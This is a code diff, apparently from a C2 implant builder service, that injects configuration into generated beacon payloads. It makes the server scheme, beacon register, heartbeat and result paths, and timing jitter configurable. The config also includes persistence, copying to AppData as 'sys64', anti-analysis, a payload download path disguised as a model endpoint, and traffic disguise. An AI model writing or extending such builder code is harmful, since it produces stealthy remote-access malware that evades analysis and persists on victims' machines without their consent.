@@ -329,27 +329,36 @@ public partial class BuilderBuildService
     {
         job.Log("=== Stage 4: Injecting Config ===");
         var req = ctx.Req;
-        var host = req.ServerHost;
-        var protocol = "http";
-        if (host.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
-            { protocol = "https"; host = host[8..]; }
-        else if (host.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
-            { host = host[7..]; }
-        var serverUrl = $"{protocol}://{host}:{req.ServerPort}";
+
+        // ── server_url：显式协议优先，否则按 host 前缀推断（缺省 http） ──
+        var scheme = (req.ServerScheme ?? string.Empty).Trim().ToLowerInvariant();
+        if (scheme != "http" && scheme != "https")
+        {
+            var hostPrefix = req.ServerHost.TrimStart().ToLowerInvariant();
+            scheme = hostPrefix.StartsWith("https://") ? "https" : "http";
+        }
+        var host = req.ServerHost.Trim();
+        host = host.Replace("https://", "", StringComparison.OrdinalIgnoreCase)
+                  .Replace("http://", "", StringComparison.OrdinalIgnoreCase)
+                  .TrimEnd('/');
+        var serverUrl = $"{scheme}://{host}:{req.ServerPort}";
+
+        // ── 连接参数：null = 服务端默认；数值做 clamp 防脏数据 ──
+        var (heartbeatMs, jitter) = ResolveConnectionTiming(req);
         var injectedConfig = new InjectedConfig
         {
             server_url = serverUrl,
-            register_path = "/api/beacon/register",
-            heartbeat_path = "/api/beacon/heartbeat",
-            result_path = "/api/beacon/result",
-            ws_path = "/ws/agent",
-            heartbeat_interval_ms = 3000,
-            jitter_percent = 0.2,
+            register_path = ResolvePath(req.RegisterPath, "/api/beacon/register"),
+            heartbeat_path = ResolvePath(req.HeartbeatPath, "/api/beacon/heartbeat"),
+            result_path = ResolvePath(req.ResultPath, "/api/beacon/result"),
+            ws_path = ResolvePath(req.WsPath, "/ws/agent"),
+            heartbeat_interval_ms = heartbeatMs,
+            jitter_percent = jitter,
             require_admin = req.RequireAdmin,
             copy_to_path = req.CopyToAppData ? "sys64" : null,
             enable_persistence = req.EnablePersistence,
-            core_download_path = $"/api/v1/models/{ctx.BuildId}",
-            core_key_path = "/api/v1/auth/token",
+            core_download_path = ResolvePath(req.CoreDownloadPath, $"/api/v1/models/{ctx.BuildId}"),
+            core_key_path = ResolvePath(req.CoreKeyPath, "/api/v1/auth/token"),
             beacon_secret = _beaconSettings.Secret,
             anti_analysis = req.AntiAnalysis,
             // 流量伪装（构建页面编辑注入；注册后服务端 profile 可覆盖）
